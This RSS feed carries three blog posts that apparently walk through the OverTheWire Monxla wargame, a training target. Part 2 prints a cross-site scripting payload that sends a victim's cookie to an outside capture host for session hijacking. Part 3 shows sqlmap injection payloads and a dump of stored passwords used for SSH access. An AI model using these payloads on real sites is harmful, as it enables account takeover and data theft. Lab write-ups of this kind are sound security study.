<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Monxla on Matt Andreko</title>
    <link>https://www.mattandreko.com/categories/monxla/index.xml</link>
    <description>Recent content in Monxla on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="https://www.mattandreko.com/categories/monxla/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>OverTheWire Monxla Part 3</title>
      <link>https://www.mattandreko.com/2012/11/26/overthewire-monxla-part-3/</link>
      <pubDate>Mon, 26 Nov 2012 05:58:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/11/26/overthewire-monxla-part-3/</guid>
      <description>&lt;p&gt;Continuing from the last post, we are now logged in as a user. The next step on the PDF from the agent, that we can access, is the Notes Service.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I started analyzing the source code, and noticed that the text that says &amp;ldquo;yes&amp;rdquo; or &amp;ldquo;no&amp;rdquo; in the table is actually an image being rendered from the hasnotes.php file. I started tinkering with that file, and found that it was vulnerable to SQL injection.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla3_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I used &lt;a href=&#34;http://sqlmap.org&#34;&gt;SQLMap&lt;/a&gt; to automate the &lt;a href=&#34;https://en.wikipedia.org/wiki/SQL_injection&#34;&gt;SQL Injection Attack&lt;/a&gt; for me. I was pretty much able to just point it at the URL and go:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot;

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:35:31

[17:35:31] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.7) Gecko/20100726 CentOS/3.6-3.el5.centos Firefox/3.6.7
[17:35:31] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[17:35:31] [INFO] testing connection to the target url
[17:35:31] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
---
[17:35:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:35:31] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;

[*] shutting down at 17:35:31
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was able to at least confirm my suspicions that a &lt;a href=&#34;https://en.wikipedia.org/wiki/SQL_injection&#34;&gt;SQL Injection Attack&lt;/a&gt; was possible.  I then attempted to have &lt;a href=&#34;http://sqlmap.org&#34;&gt;SQLMap&lt;/a&gt; list all the databases in the MySQL Server.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot; --dbs

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:36:14

[17:36:14] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)
[17:36:14] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[17:36:14] [INFO] testing connection to the target url
[17:36:14] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
---
[17:36:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:36:14] [INFO] fetching database names
[17:36:14] [INFO] the SQL query used returns 2 entries
[17:36:14] [INFO] resumed: information_schema
[17:36:14] [INFO] resumed: notes
available databases [2]:
[*] information_schema
[*] notes

[17:36:14] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;

[*] shutting down at 17:36:14
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It appears that a &amp;ldquo;notes&amp;rdquo; table exists. It may be useful to view the contents:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bash-3.2$ ./sqlmap.py -u &amp;quot;http://nasenko.otw/hasnotes.php?username=boris&amp;amp;text=1&amp;quot; --random-agent --cookie=&amp;quot;SESSID=ONzjRDDOgMa9uhLjr1BxIjxPDiiqatI1&amp;quot; -D notes --dump

    sqlmap/1.0-dev-a40d7a5 - automatic SQL injection and database takeover tool
    http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 17:36:40

[17:36:40] [INFO] fetched random HTTP User-Agent header from file &#39;/Users/mandreko/Development/sqlmap/txt/user-agents.txt&#39;: Mozilla/5.0 (X11; U; Linux i686; de; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
[17:36:40] [INFO] resuming back-end DBMS &#39;mysql&#39; 
[17:36:40] [INFO] testing connection to the target url
[17:36:40] [INFO] heuristics detected web page charset &#39;ascii&#39;
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: username
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: username=boris&#39; AND 7400=7400 AND &#39;txSM&#39;=&#39;txSM&amp;amp;text=hi

    Type: error-based
    Title: MySQL &amp;gt;= 5.0 AND error-based - WHERE or HAVING clause
    Payload: username=boris&#39; AND (SELECT 9795 FROM(SELECT COUNT(*),CONCAT(0x3a7a73763a,(SELECT (CASE WHEN (9795=9795) THEN 1 ELSE 0 END)),0x3a746f713a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND &#39;bqmu&#39;=&#39;bqmu&amp;amp;text=hi

    Type: AND/OR time-based blind
    Title: MySQL &amp;gt; 5.0.11 AND time-based blind
    Payload: username=boris&#39; AND SLEEP(5) AND &#39;FtkC&#39;=&#39;FtkC&amp;amp;text=hi
---
[17:36:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 11.10 (Oneiric Ocelot)
web application technology: Apache 2.2.20, PHP 5.3.6
back-end DBMS: MySQL 5.0
[17:36:40] [INFO] fetching tables for database: &#39;notes&#39;
[17:36:40] [INFO] the SQL query used returns 2 entries
[17:36:40] [INFO] resumed: notes
[17:36:40] [INFO] resumed: users
[17:36:40] [INFO] fetching columns for table &#39;notes&#39; in database &#39;notes&#39;
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: id
[17:36:40] [INFO] resumed: int(11)
[17:36:40] [INFO] resumed: username
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: note
[17:36:40] [INFO] resumed: text
[17:36:40] [INFO] fetching entries for table &#39;notes&#39; in database &#39;notes&#39;
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: 1
[17:36:40] [INFO] resumed: hello world
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: 2
[17:36:40] [INFO] resumed: Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: 3
[17:36:40] [INFO] resumed: Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris
[17:36:40] [INFO] resumed: vasili
[17:36:40] [INFO] analyzing table dump for possible password hashes
Database: notes
Table: notes
[3 entries]
+----+-------------------------------------------------------------------------------------------------+----------+
| id | note                                                                                            | username |
+----+-------------------------------------------------------------------------------------------------+----------+
| 1  | hello world                                                                                     | boris    |
| 2  | Boris, you should really encrypt the passwords in the notes database! Love, your brother Vasili | boris    |
| 3  | Vasili, I will look into that soon. For now, I just disabled the logins. Thanks! --Boris        | vasili   |
+----+-------------------------------------------------------------------------------------------------+----------+

[17:36:40] [INFO] table &#39;notes.notes&#39; dumped to CSV file &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/notes.csv&#39;
[17:36:40] [INFO] fetching columns for table &#39;users&#39; in database &#39;notes&#39;
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: username
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: gecos
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] resumed: password
[17:36:40] [INFO] resumed: varchar(64)
[17:36:40] [INFO] fetching entries for table &#39;users&#39; in database &#39;notes&#39;
[17:36:40] [INFO] the SQL query used returns 3 entries
[17:36:40] [INFO] resumed: Boris Nasenko
[17:36:40] [INFO] resumed: 347vEnaNufw
[17:36:40] [INFO] resumed: boris
[17:36:40] [INFO] resumed: Nikolai Grigorev
[17:36:40] [INFO] resumed: !plXIlJ42VEr_notyetset
[17:36:40] [INFO] resumed: nikolai
[17:36:40] [INFO] resumed: Vasili Nasenko
[17:36:40] [INFO] resumed: !bPXMZP6puxd_notyetset
[17:36:40] [INFO] resumed: vasili
[17:36:40] [INFO] analyzing table dump for possible password hashes
Database: notes
Table: users
[3 entries]
+------------------+----------+------------------------+
| gecos            | username | password               |
+------------------+----------+------------------------+
| Boris Nasenko    | boris    | 347vEnaNufw            |
| Nikolai Grigorev | nikolai  | !plXIlJ42VEr_notyetset |
| Vasili Nasenko   | vasili   | !bPXMZP6puxd_notyetset |
+------------------+----------+------------------------+

[17:36:40] [INFO] table &#39;notes.users&#39; dumped to CSV file &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw/dump/notes/users.csv&#39;
[17:36:40] [INFO] fetched data logged to text files under &#39;/Users/mandreko/Development/sqlmap/output/nasenko.otw&#39;

[*] shutting down at 17:36:40
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Based on the post on the front page of the Nasenko page, where it states that the SSH passwords are stored in the database, I attempted to use the passwords disclosed to login.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bash-3.2$ ssh boris@nasenko.otw
boris@nasenko.otw&#39;s password: 
Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-26-generic i686)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Nov 18 06:29:24 2012 from 192.168.188.1
boris@monxla:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that&amp;rsquo;s all it takes to get local access to the server.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>OverTheWire Monxla Part 2</title>
      <link>https://www.mattandreko.com/2012/11/25/overthewire-monxla-part-2/</link>
      <pubDate>Sun, 25 Nov 2012 05:05:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/11/25/overthewire-monxla-part-2/</guid>
      <description>&lt;p&gt;In the previous post, I showed how to get the PDF that outlines the services running on the Monxla VM image. This article will continue where that one left off.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Firstly, the PDF explains that there are 2 virtual hosts enabled on the machine. To configure my machine for these virtual hosts, I added these lines to my /etc/hosts file:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;192.168.188.134 nasenko.otw
192.168.188.134 honeylink.otw
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are 2 sites immediately available to you:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The HoneyLink site is, so far, just a convenience for the wargame, so you don&amp;rsquo;t have to setup your own HTTP server.  It gives you a prefix URL, that you can prepend anything you want to the end.  It will then show you the responses as they come in. 
&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_2.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;The Nasenko home page. This is what appears to be the main application that we are attacking. It has a Bookmark Service, and the Notes service, which were referenced in the PDF, immediately visible. 
&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_1.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After poking around a bit, I found that you are unable to access the Notes service, since you&amp;rsquo;re not logged in. Per the blog article on the main page, login attempts are disabled. On the Bookmarks page, it says that the submitted bookmarks are being visited routinely. These two statements combined immediately made me think of using a &lt;a href=&#34;https://en.wikipedia.org/wiki/Session_hijacking&#34;&gt;Session Hijacking&lt;/a&gt; attack to steal the session of the user already logged in, checking the submitted bookmarks.&lt;/p&gt;

&lt;p&gt;To get started with my attack, I tried submitting several bookmarks, which were always rejected.  There was some sort of filtering going on, on the server side.  For some reason, I decided to try submitting the Nasenko site itself, and saw that it was actually accepted.  This means that I could at least submit data, as long as it was from the same website.  From there, that made me start thinking about finding a &lt;a href=&#34;https://en.wikipedia.org/wiki/Cross-site_scripting&#34;&gt;Cross-Site Scripting&lt;/a&gt; vulnerability, so that I could redirect the traffic, and combine it with the Session Hijack attack.&lt;/p&gt;

&lt;p&gt;After searching for a bit, I found a Cross-Site Scripting vulnerability in the User Info page.  It wasn&amp;rsquo;t cleanly filtering user input, so I was able to inject javascript into the &amp;ldquo;username&amp;rdquo; parameter.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_3.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;To combine these two attacks, I crafted a URL that would use the Cross-Site Scripting attack to allow me to submit it from the proper host, as well as stealing the user&amp;rsquo;s cookie:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://nasenko.otw/userinfo.php?username=&amp;lt;script&amp;gt;document.location=&#39;http://honeylink.otw/tH3zwj4P1z/cookie&#39;+document.cookie;&amp;lt;/script&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, due to some URL encoding issues (mainly the &amp;ldquo;+&amp;rdquo; splitting the parameter), I had to URL encode it using the &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;http://nasenko.otw/userinfo.php?username=%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%68%6f%6e%65%79%6c%69%6e%6b%2e%6f%74%77%2f%74%48%33%7a%77%6a%34%50%31%7a%2f%63%6f%6f%6b%69%65%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I submitted the URL to the Bookmark Service, and it gladly accepted it.  I then switched to the HoneyLink page, and clicked the &amp;ldquo;Refresh&amp;rdquo; button, and saw that my click had indeed been registered.  And lucky for me, it had the cookie listed:&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_4.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I then added a cookie with the stolen value.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_5.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;When I then went to the Notes Service, which previously denied me access, I was able to view them. This meant it was successful. We successfully stole a valid user&amp;rsquo;s session.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla2_6.png&#34; /&gt;
    
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>OverTheWire Monxla Part 1</title>
      <link>https://www.mattandreko.com/2012/11/24/overthewire-monxla-part-1/</link>
      <pubDate>Sat, 24 Nov 2012 15:54:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/2012/11/24/overthewire-monxla-part-1/</guid>
      <description>&lt;p&gt;I had a twitter &lt;a href=&#34;https://twitter.com/Mito125twit&#34;&gt;follower&lt;/a&gt; recently inform me that OverTheWire had a new wargame up and running. &amp;nbsp;I was immediately excited and downloaded it. &amp;nbsp;Several days later, I actually was able to start tinkering with it.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;I booted up the image, and proceeded to do some preliminary nmap scans. &amp;nbsp;I found a few services runinng:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ nmap -sV -p1-65535 -T4&amp;amp;nbsp;192.168.188.134
Starting Nmap 6.01 ( http://nmap.org ) at 2012-11-15 10:28 EST
Nmap scan report for 192.168.188.134
Host is up (0.0077s latency).
Not shown: 65511 closed ports
PORT&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; STATE SERVICE VERSION
22/tcp&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; open&amp;amp;nbsp; ssh&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; OpenSSH 5.8p1 Debian 7ubuntu1 (protocol 2.0)
80/tcp&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; open&amp;amp;nbsp; http&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Apache httpd 2.2.20 ((Ubuntu))
6667/tcp&amp;amp;nbsp; open&amp;amp;nbsp; irc&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Unreal ircd
8000/tcp&amp;amp;nbsp; open&amp;amp;nbsp; http&amp;amp;nbsp;&amp;amp;nbsp;&amp;amp;nbsp; Icecast streaming media server
21342/tcp open&amp;amp;nbsp; unknown
21768/tcp open&amp;amp;nbsp; unknown
21951/tcp open&amp;amp;nbsp; unknown
23917/tcp open&amp;amp;nbsp; unknown
24578/tcp open&amp;amp;nbsp; unknown
24783/tcp open&amp;amp;nbsp; unknown
25275/tcp open&amp;amp;nbsp; unknown
26791/tcp open&amp;amp;nbsp; unknown
31308/tcp open&amp;amp;nbsp; unknown
31418/tcp open&amp;amp;nbsp; unknown
31874/tcp open&amp;amp;nbsp; unknown
32704/tcp open&amp;amp;nbsp; unknown
33039/tcp open&amp;amp;nbsp; unknown
34466/tcp open&amp;amp;nbsp; unknown
34538/tcp open&amp;amp;nbsp; unknown
34957/tcp open&amp;amp;nbsp; unknown
36199/tcp open&amp;amp;nbsp; unknown
37213/tcp open&amp;amp;nbsp; unknown
37628/tcp open&amp;amp;nbsp; unknown
37956/tcp open&amp;amp;nbsp; unknown
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Based on the clue on the &lt;a href=&#34;http://www.overthewire.org/wargames/monxla&#34;&gt;Monxla page&lt;/a&gt;, &amp;ldquo;Hint: how big is the page you are looking at?&amp;ldquo;, I connected to the webserver.&lt;/p&gt;


&lt;figure class=&#34;img-responsive&#34;&gt;
    
        &lt;img src=&#34;https://www.mattandreko.com/img/monxla1_1.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It looked like a fairly generic page, but I viewed the source, and found a huge amount of text commented out. &amp;nbsp;Since it was all alpha-numeric other than ending with a single &amp;ldquo;=&amp;rdquo;, I figured it was probably &lt;a href=&#34;https://en.wikipedia.org/wiki/Base64&#34;&gt;Base64&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I copied the text into a new file on my machine. I then decoded it and found out what type of file it was:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko$ base64 -D monxla -o monxla.decoded
mandreko$ file monxla.decoded
monxla.decoded: PDF document, version 1.4
mandreko$ mv monxla.decoded monxla.pdf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When the PDF (available &lt;a href=&#34;https://docs.google.com/open?id=0B6AIn0P1_ECKbzJaMEQ0VXhsZU0&#34;&gt;here&lt;/a&gt;) is then opened, it shows a report of running services that may need attacked.  This is similar to &amp;ldquo;levels&amp;rdquo; in most wargames, I believe (I haven&amp;rsquo;t yet finished this wargame).&lt;/p&gt;

&lt;p&gt;My next article in this series will show how to exploit the &amp;ldquo;Bookmarks Service&amp;rdquo;.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>